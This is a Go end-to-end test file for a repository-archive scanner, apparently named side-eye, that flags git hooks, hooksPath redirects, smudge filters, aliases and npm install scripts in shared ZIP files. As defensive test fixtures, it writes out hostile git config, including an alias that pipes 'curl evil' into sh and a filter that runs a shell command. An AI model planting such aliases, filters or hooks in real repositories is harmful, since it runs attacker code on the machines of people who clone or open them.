package e2e

import (
	"path/filepath"
	"strings"
	"testing"
)

// TestE2EZipWithGitDir checks a ZIP from another party that carries a .git
// directory. A plain GitHub download strips .git, but a ZIP shared by hand can
// hide hooksPath and filter commands in it, so they must still be scanned.
func TestE2EZipWithGitDir(t *testing.T) {
	archive := filepath.Join(t.TempDir(), "side-eye-main.zip")
	writeZip(t, archive, e2eZipFiles(true))

	res := runSideEye(t, "-json", archive)
	if res.exit != 1 {
		t.Fatalf("exit = %d, want 1\nstderr: %s", res.exit, res.stderr)
	}
	findings := scanJSON(t, res.stdout)
	assertTitles(t, findings, []string{
		"core.hooksPath",
		"filter.evil.smudge",
		"Active git hook: pre-commit",
		"Tracked hook file: pre-commit",
		"Husky hooks directory present",
		"Attribute binds filter=evil",
		"npm install script: postinstall",
	})
	if hasTitle(findings, "Active git hook: pre-push") {
		t.Error("core.hooksPath must redirect hooks away from .git/hooks")
	}
}

// TestE2EZipWithoutGitDir checks the shared worktree checks run on a ZIP with no
// .git, and the report warns the user that config and hooks were not scanned.
func TestE2EZipWithoutGitDir(t *testing.T) {
	archive := filepath.Join(t.TempDir(), "side-eye-main.zip")
	writeZip(t, archive, e2eZipFiles(false))

	res := runSideEye(t, archive)
	if res.exit != 1 {
		t.Fatalf("exit = %d, want 1\nstderr: %s", res.exit, res.stderr)
	}
	for _, want := range []string{"😒", "Tracked hook file: pre-commit", "Attribute binds filter=evil"} {
		if !strings.Contains(res.stdout, want) {
			t.Errorf("zip output missing %q\n%s", want, res.stdout)
		}
	}
	if !strings.Contains(res.stdout, "no .git directory") {
		t.Errorf("zip advice missing\n%s", res.stdout)
	}

	resJSON := runSideEye(t, "-json", archive)
	if hasTitle(scanJSON(t, resJSON.stdout), "core.hooksPath") {
		t.Error("zip without .git must not report git config findings")
	}
}

// TestE2EZipClean checks an archive with no risky files exits 0 and prints the
// all-clear.
func TestE2EZipClean(t *testing.T) {
	archive := filepath.Join(t.TempDir(), "clean-main.zip")
	writeZip(t, archive, map[string]string{
		"clean-main/README.md": "hello\n",
		"clean-main/main.go":   "package main\n",
	})

	res := runSideEye(t, archive)
	if res.exit != 0 {
		t.Fatalf("exit = %d, want 0\nstderr: %s\nstdout: %s", res.exit, res.stderr, res.stdout)
	}
	if !strings.Contains(res.stdout, "No code that runs on clone, open, or commit") {
		t.Errorf("clean zip output = %q", res.stdout)
	}
}

// TestE2EZipEvasion hides a scam behind an include and an absolute hooks path.
// TestE2EZipEvasion checks two common evasions still surface: an alias hidden in
// an included config file, and an absolute hooksPath that points outside the
// archive and cannot be scanned.
func TestE2EZipEvasion(t *testing.T) {
	archive := filepath.Join(t.TempDir(), "app-main.zip")
	writeZip(t, archive, map[string]string{
		"app/.git/config":           "[core]\n\thooksPath = /tmp/evil\n[include]\n\tpath = hidden.cfg\n",
		"app/.git/hidden.cfg":       "[alias]\n\tpwn = !curl evil | sh\n",
		"app/.git/hooks/pre-commit": "#!/bin/sh\n",
	})

	res := runSideEye(t, "-json", archive)
	if res.exit != 1 {
		t.Fatalf("exit = %d, want 1\nstderr: %s", res.exit, res.stderr)
	}
	findings := scanJSON(t, res.stdout)
	assertTitles(t, findings, []string{"core.hooksPath", "include.path", "alias.pwn"})
	if hasTitle(findings, "Active git hook: pre-commit") {
		t.Error("an absolute hooks path cannot be scanned inside the archive")
	}
}

func e2eZipFiles(withGit bool) map[string]string {
	files := map[string]string{
		"side-eye-main/.gitattributes":    "*.bin filter=evil\n",
		"side-eye-main/package.json":      `{"scripts":{"postinstall":"node x.js"}}`,
		"side-eye-main/.husky/pre-commit": "#!/bin/sh\n",
	}
	if withGit {
		files["side-eye-main/.git/config"] = "[core]\n\thooksPath = .githooks\n[filter \"evil\"]\n\tsmudge = sh -c x\n"
		files["side-eye-main/.githooks/pre-commit"] = "#!/bin/sh\n"
		files["side-eye-main/.git/hooks/pre-push"] = "#!/bin/sh\n"
	}
	return files
}
